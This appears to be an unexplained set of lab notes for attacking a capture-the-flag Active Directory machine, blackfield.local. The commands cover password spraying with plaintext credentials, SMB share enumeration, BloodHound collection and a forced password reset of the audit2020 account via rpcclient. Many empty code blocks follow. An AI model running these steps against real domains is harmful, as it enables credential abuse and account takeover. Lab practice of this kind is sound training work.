[[Editing Copy Page]]

```
cp ~/Desktop/Tools/Windows/nxc-sweep . && ./nxc-sweep 10.129.229.17 -u audit2020 -p '#00^BlackKnight'
```

```
cp ~/Desktop/Tools/Windows/nxc-sweep . && ./nxc-sweep 10.129.229.17 -u users -p '#00^BlackKnight --continue-on-success'
```

```
smbclient //10.129.229.17/profiles$ -c 'recurse;ls'
```

```
nxc smb blackfield.local -u audit2020 -p '#00^BlackKnight' --shares
```

```
cp ~/Desktop/Tools/Windows/nxc-sweep . && ./nxc-sweep 10.129.229.17 -u 'support' -p '#00^BlackKnight'
```

```
smbclient -U support -L //10.129.229.17/forensic -c 'recurse;ls'
```

```
bloodhound-python -u 'support' -p '#00^BlackKnight' -d blackfield.local -dc 10.129.229.17 -ns 10.129.229.17 -c All
```

```
rpcclient -U 'blackfield.local/support%#00^BlackKnight' 10.129.229.17 -c 'setuserinfo2 audit2020 23 "Retric"
```

```
cp ~/Desktop/Tools/Windows/nxc-sweep . && ./nxc-sweep 10.129.229.17 -u 'audit2020' -p 'Retric'
```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```